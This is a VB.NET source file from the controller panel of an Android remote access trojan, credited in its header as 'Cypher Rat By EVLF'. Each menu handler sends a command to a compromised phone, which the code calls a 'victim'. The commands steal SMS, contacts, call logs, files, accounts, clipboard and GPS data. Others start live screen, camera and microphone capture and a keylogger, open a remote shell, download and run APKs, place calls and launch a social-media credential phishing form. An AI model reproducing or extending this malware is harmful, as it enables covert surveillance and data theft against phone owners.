Imports System.Drawing.Drawing2D
 Imports System.Net.Sockets
'------------------------------------
'---------Cypher Rat By EVLF
'-----------------------------------
'---------t.me/evlfdev
'------------------------------------
Public Class ClientCard
    Public cClient As New TcpClient
    Public ClassClient As sockets.Client
    Public UUID As String
    Public Sub New()
        InitializeComponent()
    End Sub
    Public Sub New(
                   clas As sockets.Client)
        InitializeComponent()
        MyBase.BorderStyle = Windows.Forms.BorderStyle.None
        Me.ClassClient = clas
        Me.Tag = clas.UUID
        Me.cClient = clas.myClient
        Me.ProfilePic.Image = ChangeOpacity(clas.Wallpaper(0))
        Me.clientname.Text = clas.ClientName
        Me.flagpic.Image = clas.Flag
        Me.PhoneScreenPic.Image = clas.Screen
        Me.BattaryPic.Image = clas.Battery
        Me.NetworkPic.Image = clas.Wifi
        Me.UUID = clas.UUID
        Me.pingtext.Text = "..."
        Me.androver.Text = clas.android
        clas.Card = Me
    End Sub
    Private Sub FilesToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FilesToolStripMenuItem1.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".files" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getfiles & sockets.Data.SPL_SOCKET & "files" & sockets.Data.SPL_DATA & "get0", Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub CallLogToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CallLogToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".calls" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getCalls & sockets.Data.SPL_SOCKET & "calls", Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub MessegesToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MessegesToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".sms" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getSMS & sockets.Data.SPL_SOCKET & "sms" & sockets.Data.SPL_DATA & "content://sms/", Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub ContactsToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ContactsToolStripMenuItem1.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".contacts" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getContacts & sockets.Data.SPL_SOCKET & "contacts", Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub AccountsToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles AccountsToolStripMenuItem1.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.Account & sockets.Data.SPL_SOCKET & "account", Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub ApplecationsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ApplecationsToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".apps" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.Apps & sockets.Data.SPL_SOCKET & "apps", Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub AliveScreenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles AliveScreenToolStripMenuItem.Click

        If Not ClassClient Is Nothing Then
            Dim cClient = ClassClient.myClient
            Dim handle As String = "Live_Screen_" & ClassClient.ClientAddressIP

            Dim Screener As ScreenShoter = My.Application.OpenForms(handle)

            If Screener Is Nothing Then

                Screener = New ScreenShoter

                Screener.Name = handle

                Screener.Title = String.Format("{0} - IP:{1}", "Live Screen", ClassClient.ClientAddressIP)

                Screener.Tag = ClassClient.ClientAddressIP

                Screener.classClient = ClassClient

                Screener.Client = ClassClient.myClient

                Screener.DownloadsFolder = ClassClient.FolderUSER

                DirectCast(Screener, Control).Show()
            End If

        End If
    End Sub
    Private Sub CameraToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles CameraToolStripMenuItem1.Click
        If Not ClassClient Is Nothing Then
            Dim handle As String = "Camera_Manager_" & ClassClient.ClientRemoteAddress
            Dim CameraManager As CameraManager = My.Application.OpenForms(handle)
            If CameraManager Is Nothing Then
                CameraManager = New CameraManager
                CameraManager.Name = handle
                CameraManager.Title = String.Format("{0} - IP:{1}", "Camera Manager", ClassClient.ClientAddressIP)
                CameraManager.classClient = ClassClient
                If CameraManager.classClient IsNot Nothing Then
                    reso.Directory_Exist(CameraManager.classClient)
                    CameraManager.tmpFolderUSER = CameraManager.classClient.FolderUSER
                End If
                CameraManager.Client = ClassClient.myClient
                CameraManager.CameraClient = cClient
                CameraManager.classCamera = ClassClient
                CameraManager.MainClassCamera = ClassClient
                CameraManager.TempImage = New PictureBox
                DirectCast(CameraManager, Control).Show()
            Else
                Return
            End If
        End If
    End Sub
    Private Sub MicroPhoneToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles MicroPhoneToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim handle As String = "Microphone_" & ClassClient.ClientRemoteAddress
            Dim Microphone As Microphone = My.Application.OpenForms(handle)
            If Microphone Is Nothing Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                If Not spl.Length >= infoServer.KeySize Then
                    Return
                End If
                Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".microphone" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "start" & sockets.Data.SPL_DATA & spl(0) & sockets.Data.SPL_DATA & spl(1) & sockets.Data.SPL_DATA & "8000" & sockets.Data.SPL_DATA & SecurityKey.MicwaveOutByte & sockets.Data.SPL_DATA & ClassClient.ClientRemoteAddress & sockets.Data.SPL_DATA & "0", Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            End If
        End If
    End Sub
    Private Sub KeyloggerToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            ClassClient.Keylogg = True
            Dim objs As Object() = {cClient, SecurityKey.KeysClient8 & sockets.Data.SPL_SOCKET & SecurityKey.Keylogger & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & "(unknown)", Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub LocationToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles LocationToolStripMenuItem1.Click
        If Not ClassClient Is Nothing Then
            ClassClient.qitGPS = False
            Dim objs As Object() = {cClient, SecurityKey.KeysClient3 & sockets.Data.SPL_SOCKET & sockets.Data.SPL_DATA & sockets.Data.SPL_SOCKET & SecurityKey.getGPS, Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub CallNumberToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles CallNumberToolStripMenuItem1.Click
        Dim CP As New CallPhone
        CP.L0.Text = "add Number"
        CP.StartPosition = FormStartPosition.Manual
        CP.Location = Codes.FixSize(sockets.Data.angelform, CP)
        Dim num As String = Nothing
        Dim Flag As String = Nothing
        If CP.ShowDialog() = DialogResult.OK Then
            num = CP.TextBox1.Text
            Flag = CP._Call
        Else
            CP.Close()
            GoTo SKIP
        End If
        CP.Close()
        If num = Nothing Then
            GoTo SKIP
        Else
            Try
                If Not ClassClient Is Nothing Then
                    Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & Flag & sockets.Data.SPL_DATA & "tel:" & num.Trim, Codes.Encoding().GetBytes("null"), ClassClient}
                    ClassClient.SendAsync(objs)
                End If
            Finally
            End Try
        End If
SKIP:
    End Sub
    Private Sub DownloadAPKRUNToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadAPKRUNToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim result As Dialog1 = New Dialog1
            result.Title = "Enter APK Link"
            result.ShowDialog()
            If result.DialogResult = DialogResult.OK Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                Dim chk0, chk1 As Integer
                chk0 = 0
                chk1 = 0
                Dim objs As Object() = {cClient, SecurityKey.KeysClient2 & sockets.Data.SPL_SOCKET & "msg:" & reso.ChekLink(result.Mytext.Text) & ":up" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & SecurityKey.Lockscreen & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            Else
                Return
            End If
        End If
    End Sub
    Private Sub ShowMessegeToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ShowMessegeToolStripMenuItem1.Click
        If Not ClassClient Is Nothing Then
            Dim result As Dialog1 = New Dialog1
            result.Title = "Enter Messege"
            result.ShowDialog()
            If result.DialogResult = DialogResult.OK Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                Dim chk0, chk1 As Integer
                chk0 = 0
                chk1 = 0
                Dim objs As Object() = {cClient, SecurityKey.KeysClient2 & sockets.Data.SPL_SOCKET & "msg:" & result.Mytext.Text & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & SecurityKey.Lockscreen & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            Else
                Return
            End If
        End If
    End Sub
    Private Sub ClipBoardToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ClipBoardToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getClipboard & sockets.Data.SPL_SOCKET & "get" & sockets.Data.SPL_DATA & "null", Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub OpenLinkToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles OpenLinkToolStripMenuItem1.Click
        If Not ClassClient Is Nothing Then
            Dim result As Dialog1 = New Dialog1
            result.Title = "Enter Link"
            result.ShowDialog()
            If result.DialogResult = DialogResult.OK Then
                Dim spl As String() = ClassClient.Keys.Split(":")
                Dim chk0, chk1 As Integer
                chk0 = 0
                chk1 = 0
                Dim objs As Object() = {cClient, SecurityKey.KeysClient2 & sockets.Data.SPL_SOCKET & "lnk<*>" & reso.ChekLink(result.Mytext.Text) & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & SecurityKey.Lockscreen & sockets.Data.SPL_SOCKET & CStr(chk0) & sockets.Data.SPL_SOCKET & CStr(chk1) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Codes.Encoding().GetBytes("null"), ClassClient}
                ClassClient.SendAsync(objs)
            Else
                Return
            End If
        End If
    End Sub
    Private Sub ShellToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ShellToolStripMenuItem1.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".terminal" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.getCommand & sockets.Data.SPL_SOCKET & "run", Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub SocialMediaHunterToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SocialMediaHunterToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim handle As String = "SM_Hunter_" & ClassClient.ClientAddressIP
            Dim Screener As Faker = My.Application.OpenForms(handle)
            If Screener Is Nothing Then
                Screener = New Faker
                Screener.Name = handle
                Screener.Title = String.Format("{0} - IP:{1}", "SM Hunter", ClassClient.ClientAddressIP)
                Screener.Tag = ClassClient.ClientAddressIP
                Screener.classClient = ClassClient
                Screener.Client = ClassClient.myClient
                Screener.DownloadsFolder = ClassClient.FolderUSER
                DirectCast(Screener, Control).Show()
            End If
        Else
            Return
        End If
    End Sub
    Private Sub PhoneInfoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PhoneInfoToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.Information & sockets.Data.SPL_SOCKET & "information", Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub EditConnectionInfoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EditConnectionInfoToolStripMenuItem.Click
        Dim sock As New EditSocket
        sock.StartPosition = FormStartPosition.Manual
        sock.Location = Codes.FixSize(sockets.Data.angelform, sock)
        Select Case sock.ShowDialog(Me)
            Case DialogResult.OK
                If sock.DGV0.Rows.Count > 0 Then
                    Dim ip, ports As String
                    ip = Nothing
                    ports = Nothing
                    For Each connection In sock.DGV0.Rows
                        Dim ro As String = DirectCast(connection, Windows.Forms.DataGridViewRow).Cells(0).Value.ToString()
                        Dim s As String() = ro.ToString.Trim.Split({":"}, StringSplitOptions.None)
                        ip &= s(0) & ":"
                        ports &= s(1) & ":"
                    Next
                    ip = ip.Substring(0, ip.Length - 1)
                    ports = ports.Substring(0, ports.Length - 1)
                    Try
                        If Not ClassClient Is Nothing Then
                            Dim getKey As String() = ClassClient.Keys.Split(":")
                            Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "edit" & sockets.Data.SPL_DATA & ip & sockets.Data.SPL_DATA & getKey(3) & sockets.Data.SPL_DATA & ports & sockets.Data.SPL_DATA & getKey(4), Codes.Encoding().GetBytes("null"), ClassClient}
                            ClassClient.SendAsync(objs)
                        End If
                    Finally
                    End Try
                End If
                sock.Close()
            Case Else
                sock.Close()
        End Select
    End Sub
    Private Sub RenameToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles RenameToolStripMenuItem1.Click
        Dim p As New inp
        p.Text = "Rename victim"
        p.LTitle.Text = "add new name"
        p.InputText.Text = "Hacked"
        p.StartPosition = FormStartPosition.Manual
        p.Location = Codes.FixSize(sockets.Data.angelform, p)
        Select Case p.ShowDialog(Me)
            Case DialogResult.OK
                Try
                    If Not ClassClient Is Nothing Then
                        Dim getKey As String() = ClassClient.Keys.Split(":")
                        Dim objs As Object() = {cClient, SecurityKey.KeysClient1 & sockets.Data.SPL_SOCKET & reso.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & SecurityKey.resultClient & sockets.Data.SPL_SOCKET & "rename" & sockets.Data.SPL_DATA & p.InputText.Text & sockets.Data.SPL_DATA & getKey(2), Codes.Encoding().GetBytes("null"), ClassClient}
                        ClassClient.SendAsync(objs)
                        ClassClient.ClientName = p.InputText.Text
                        reso.Directory_Exist(ClassClient)
                    End If
                Finally
                End Try
        End Select
        p.Close()
    End Sub
    Private Sub RestartConnectionToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartConnectionToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, SecurityKey.KeysClient5 & sockets.Data.SPL_SOCKET & "1000", Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
            sockets.Data.angelform.clientsflow.Controls.Remove(Me)
            ClassClient.Card = Nothing
            ClassClient.Close(cClient, "")
        End If
    End Sub
    Delegate Sub updatenew()
    Public Sub UpdateValue()
        If Me.InvokeRequired Then
            Dim logr As updatenew = New updatenew(AddressOf UpdateValue)
            Me.Invoke(logr)
            Exit Sub
        Else
            Me.ProfilePic.Image = ClassClient.Wallpaper(0)
            Me.flagpic.Image = ClassClient.Flag
            Me.PhoneScreenPic.Image = ClassClient.Screen
            Me.BattaryPic.Image = ClassClient.Battery
            Me.NetworkPic.Image = ClassClient.Wifi
            Me.pingtext.Text = ClassClient.Statistics
            Me.Actvnow.Text = ClassClient.ActiveNow
            If ClassClient.isnewnotifi Then
                Me.notpic.Image = My.Resources.notifi
            End If
        End If
    End Sub
    Private Sub CloseToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem1.Click
        If Not ClassClient Is Nothing Then
            Dim objs As Object() = {cClient, SecurityKey.KeysClient2 & sockets.Data.SPL_SOCKET & "kill<*>" & "x" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & SecurityKey.Lockscreen & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & CStr(0) & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & ClassClient.ClientRemoteAddress, Codes.Encoding().GetBytes("null"), ClassClient}
            ClassClient.SendAsync(objs)
        End If
    End Sub
    Private Sub ClientCard_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles MyBase.MouseDoubleClick
        If Not ClassClient Is Nothing Then
            Dim down As String = ClassClient.FolderUSER
            If Not IO.Directory.Exists(down) Then
                IO.Directory.CreateDirectory(down)
            End If
            Process.Start(down)
        End If
    End Sub
    Private Sub Flagpic_MouseEnter(sender As Object, e As EventArgs) Handles flagpic.MouseEnter
        If Not ClassClient Is Nothing Then
            infome.Show(ClassClient.Country, flagpic, 2000)
        End If
    End Sub
    Private Sub BattaryPic_MouseEnter(sender As Object, e As EventArgs) Handles BattaryPic.MouseEnter
        If Not ClassClient Is Nothing Then
            infome.Show(ClassClient.BatteryCharge.Replace("f", "").Replace("t", ""), BattaryPic, 2000)
        End If
    End Sub
    Private Sub ClientCard_Paint(sender As Object, e As PaintEventArgs) Handles MyBase.Paint
        Dim rect As Rectangle = Me.ClientRectangle 'Drawing Rounded Rectangle
        rect.X = rect.X + 1
        rect.Y = rect.Y + 1
        rect.Width -= 2
        rect.Height -= 2
        Using bb As GraphicsPath = GetPath(rect, 10)
            Using br As Brush = New SolidBrush(FillColor)
                e.Graphics.SmoothingMode = SmoothingMode.HighQuality
                e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic
                e.Graphics.FillPath(br, bb)
            End Using
            Using br As Brush = New SolidBrush(ForeColor)
                rect.Inflate(-1, -1)
                e.Graphics.SmoothingMode = SmoothingMode.HighQuality
                e.Graphics.InterpolationMode = InterpolationMode.HighQualityBicubic
                e.Graphics.DrawPath(New Pen(br, 0), bb)
            End Using
        End Using
    End Sub
    Private Function FillColor() As Color
        Return Color.Transparent
    End Function
    Protected Function GetPath(ByVal rc As Rectangle, ByVal r As Int32) As GraphicsPath
        Dim x As Int32 = rc.X, y As Int32 = rc.Y, w As Int32 = rc.Width, h As Int32 = rc.Height - 1
        r = r << 1
        Dim path As GraphicsPath = New GraphicsPath()
        If r > 0 Then
            If (r > h) Then r = h
            If (r > w) Then r = w
            path.AddArc(x, y, r, r, 180, 90)
            path.AddArc(x + w - r, y, r, r, 270, 90)
            path.AddArc(x + w - r, y + h - r, r, r, 0, 90)
            path.AddArc(x, y + h - r, r, r, 90, 90)
            path.CloseFigure()
        Else
            path.AddRectangle(rc)
        End If
        Return path
    End Function
    Private Sub ProfilePic_MouseDown(sender As Object, e As MouseEventArgs) Handles ProfilePic.MouseDown
        If e.Button = MouseButtons.Right Then
            ctxMenu.Show(Me, e.Location)
        Else
            Dim getKEY As String() = ClassClient.Keys.Split(":")
            If Not getKEY.Length >= infoServer.KeySize Then
                Return
            End If
            Dim TipText As String = "Client-Info" & vbNewLine _
                                    & "Name:" & ClassClient.ClientName & vbNewLine _
                                    & "Defender:" & ClassClient.ClientDefender & vbNewLine _
                                    & "From:" & ClassClient.Country & vbNewLine _
                                    & "Host:" & getKEY(6) & vbNewLine _
                                    & "ip:" & getKEY(0) & vbNewLine _
                                    & "Andorid:" & ClassClient.android & vbNewLine _
                                    & "Port:" & getKEY(1) & vbNewLine
            infome.Show(TipText, ProfilePic, 2500)
        End If
    End Sub
    Private Sub ProfilePic_MouseEnter(sender As Object, e As EventArgs) Handles ProfilePic.MouseEnter
        Me.BackColor = Color.FromArgb(42, 42, 42)
    End Sub
    Private Sub ProfilePic_MouseLeave(sender As Object, e As EventArgs) Handles ProfilePic.MouseLeave
        Me.BackColor = Color.Transparent
    End Sub
    Private Sub PhoneScreenPic_MouseEnter(sender As Object, e As EventArgs) Handles PhoneScreenPic.MouseEnter
        infome.Show("Last Calls : " & ClassClient.CALLS.Replace(">null", ""), PhoneScreenPic, 2000)
    End Sub
    Private Sub ClientCard_Load(sender As Object, e As EventArgs) Handles MyBase.Load
    End Sub
    Private Sub NotificationsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles NotificationsToolStripMenuItem.Click
        If Not ClassClient Is Nothing Then
            Dim handle As String = "Notifications_" & ClassClient.ClientAddressIP
            Dim Notifications As NotifiForm = My.Application.OpenForms(handle)
            If Notifications Is Nothing Then
                Notifications = New NotifiForm
                Notifications.ClassClient = ClassClient
                DirectCast(Notifications, Control).Show()
            End If
        End If
    End Sub
End Class
